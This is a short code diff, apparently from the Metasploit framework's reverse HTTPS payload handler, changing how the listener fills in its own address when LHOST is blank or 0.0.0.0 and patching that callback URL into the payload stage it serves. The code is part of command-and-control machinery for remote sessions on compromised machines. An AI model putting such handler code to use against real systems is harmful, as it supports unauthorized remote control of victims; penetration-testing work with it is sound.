@@ -124,11 +124,18 @@ protected
 
 		print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")
 
+		lhost = datastore['LHOST']
+		
+		# Default to our own IP if the user specified 0.0.0.0 (pebkac avoidance) 
+		if lhost.empty? or lhost == '0.0.0.0'
+			lhost = Rex::Socket.source_address(cli.peerhost)
+		end
+		
 		# Process the requested resource.
 		case req.relative_resource
 			when /^\/INITJM/
 				conn_id = "CONN_" + Rex::Text.rand_text_alphanumeric(16)
-				url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}/" + conn_id + "/\x00"
+				url = "https://#{lhost}:#{datastore['LPORT']}/" + conn_id + "/\x00"
 				#$stdout.puts "URL: #{url.inspect}"
 
 				blob = ""
@@ -176,7 +183,7 @@ protected
 				conn_id = "CONN_" + Rex::Text.rand_text_alphanumeric(16)
 				i = blob.index("https://" + ("X" * 256))
 				if i
-					url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}/" + conn_id + "/\x00"
+					url = "https://#{lhost}:#{datastore['LPORT']}/" + conn_id + "/\x00"
 					blob[i, url.length] = url
 				end
 				print_status("Patched URL at offset #{i}...")
